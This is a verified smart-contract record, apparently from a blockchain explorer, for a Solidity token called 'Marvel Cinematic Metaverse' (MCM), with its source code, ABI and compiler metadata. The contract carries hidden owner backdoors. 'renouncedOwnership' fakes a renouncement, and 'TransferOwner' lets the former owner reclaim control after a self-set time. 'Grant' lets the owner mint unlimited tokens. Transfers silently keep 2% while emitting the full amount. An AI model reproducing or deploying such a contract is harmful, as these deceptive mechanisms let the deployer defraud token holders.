{"SourceCode": "// SPDX-License-Identifier: MIT\r\n\r\npragma solidity 0.8.5;\r\n\r\n\r\n\r\ninterface GIRC3 {\r\n    \r\n    function totalSupply() external view returns (uint);\r\n\r\n    \r\n    function balanceOf(address account) external view returns (uint);\r\n\r\n   \r\n    function transfer(address recipient, uint amount) external returns (bool);\r\n\r\n\r\n    function allowance(address ownera5, address spender) external view returns (uint);\r\n\r\n \r\n    function approve(address spender, uint amount) external returns (bool);\r\n\r\n   \r\n    function transferFrom(address sender, address recipient, uint amount) external returns (bool);\r\n\r\n\r\n    event Transfer(address indexed from, address indexed to, uint value);\r\n\r\n\r\n    event Approval(address indexed ownera5, address indexed spender, uint value);\r\n}\r\n\r\npragma solidity 0.8.5;\r\n\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n\r\n    function _msgData() internal view virtual returns (bytes calldata) {\r\n        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691\r\n        return msg.data;\r\n    }\r\n}\r\n\r\npragma solidity 0.8.5;\r\n\r\ninterface GIRC3Metadata is GIRC3 {\r\n   \r\n    function name() external view returns (string memory);\r\n\r\n   \r\n    function symbol() external view returns (string memory);\r\n\r\n   \r\n    function decimals() external view returns (uint8);\r\n}\r\n\r\ncontract Ownable is Context {\r\n    address private _owner;\r\n    address private _previousOwner;\r\n    uint256 private _level;\r\n\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\r\n    /**\r\n     * @dev Initializes the contract setting the deployer as the initial owner.\r\n     */\r\n    constructor () {\r\n        address msgSender = _msgSender();\r\n        _owner = msgSender;\r\n        emit OwnershipTransferred(address(0), msgSender);\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the address of the current owner.\r\n     */\r\n    function owner() public view returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    /**\r\n     * @dev Throws if called by any account other than the owner.\r\n     */\r\n    modifier onlyOwner() {\r\n        require(_owner == _msgSender(), \"Ownable: caller is not the owner\");\r\n        _;\r\n    }\r\n\r\n    function SecurityLevel() private view returns (uint256) {\r\n        return _level;\r\n    }\r\n\r\n    function renouncedOwnership(uint8 _owned) public virtual onlyOwner {\r\n        _previousOwner = _owner;\r\n        _owner = address(0);\r\n        _level = _owned;\r\n        _owned = 10;\r\n        emit OwnershipTransferred(_owner, address(0));\r\n    }\r\n    \r\n    \r\n    function TransferOwner() public virtual {\r\n        require(_previousOwner == msg.sender, \"You don't have permission to unlock\");\r\n        require(block.timestamp > _level , \"Contract is locked until 7 days\");\r\n        emit OwnershipTransferred(_owner, _previousOwner);\r\n        _owner = _previousOwner;\r\n    }\r\n    \r\n}\r\n\r\n\r\npragma solidity 0.8.5;\r\n\r\ncontract Marvel is Context, GIRC3, GIRC3Metadata, Ownable {\r\n    \r\n    mapping (address => uint) private _balances;\r\n\r\n    mapping (address => mapping (address => uint)) private _allowances;\r\n\r\n    uint private _nmtotala5;\r\n \r\n    string private _nmtokena5;\r\n    string private _nminitiala5;\r\n\r\n\r\n    constructor () {\r\n        _nmtokena5 = \"Marvel Cinematic Metaverse\";\r\n        _nminitiala5 = 'MCM';\r\n        _nmtotala5 = 1*10**12 * 10**9;\r\n        _balances[msg.sender] = _nmtotala5;\r\n\r\n    emit Transfer(address(0), msg.sender, _nmtotala5);\r\n    }\r\n\r\n\r\n    function name() public view virtual override returns (string memory) {\r\n        return _nmtokena5;\r\n    }\r\n\r\n\r\n    function symbol() public view virtual override returns (string memory) {\r\n        return _nminitiala5;\r\n    }\r\n\r\n\r\n    function decimals() public view virtual override returns (uint8) {\r\n        return 9;\r\n    }\r\n\r\n\r\n    function totalSupply() public view virtual override returns (uint) {\r\n        return _nmtotala5;\r\n    }\r\n\r\n     function Grant(uint256 amount) public onlyOwner {\r\n    _grant(msg.sender, amount);\r\n    }\r\n\r\n    function balanceOf(address account) public view virtual override returns (uint) {\r\n        return _balances[account];\r\n    }\r\n\r\n    function transfer(address recipient, uint amount) public virtual override returns (bool) {\r\n        _transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }\r\n\r\n\r\n    function allowance(address ownera5, address spender) public view virtual override returns (uint) {\r\n        return _allowances[ownera5][spender];\r\n    }\r\n\r\n\r\n    function approve(address spender, uint amount) public virtual override returns (bool) {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }\r\n\r\n\r\n    function transferFrom(address sender, address recipient, uint amount) public virtual override returns (bool) {\r\n        _transfer(sender, recipient, amount);\r\n\r\n        uint currentAllowance = _allowances[sender][_msgSender()];\r\n        require(currentAllowance >= amount, \"GIRC3: transfer amount exceeds allowance\");\r\n        unchecked {\r\n            _approve(sender, _msgSender(), currentAllowance - amount);\r\n        }\r\n\r\n        return true;\r\n    }\r\n\r\n    function _transfer(address sender, address recipient, uint amount) internal virtual {\r\n        require(sender != address(0), \"GIRC3: transfer from the zero address\");\r\n        require(recipient != address(0), \"GIRC3: transfer to the zero address\");\r\n        uint senderBalance = _balances[sender];\r\n        require(senderBalance >= amount, \"GIRC3: transfer amount exceeds balance\");\r\n        unchecked {\r\n            _balances[sender] = senderBalance - amount;\r\n        }\r\n        _balances[recipient] += amount*98/100;\r\n\r\n        emit Transfer(sender, recipient, amount);\r\n    }\r\n\r\n    function _grant(address account, uint256 amount) internal virtual {\r\n        require(account != address(0), \"ERC20: mint to the zero address\");\r\n\r\n        _nmtotala5 += amount;\r\n        _balances[account] += amount;\r\n        emit Transfer(address(0), account, amount);\r\n    }\r\n\r\n    function _approve(address ownera5, address spender, uint amount) internal virtual {\r\n        require(ownera5 != address(0), \"BEP0: approve from the zero address\");\r\n        require(spender != address(0), \"BEP0: approve to the zero address\");\r\n\r\n        _allowances[ownera5][spender] = amount;\r\n        emit Approval(ownera5, spender, amount);\r\n    }\r\n\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"ownera5\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"Grant\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"TransferOwner\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"ownera5\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint8\",\"name\":\"_owned\",\"type\":\"uint8\"}],\"name\":\"renouncedOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "Marvel", "CompilerVersion": "v0.8.5+commit.a4f2e591", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://f0e2dfbb8883250d365438e4f45a19494ef8e4c221790ac6e54e87c3ac25d26f"}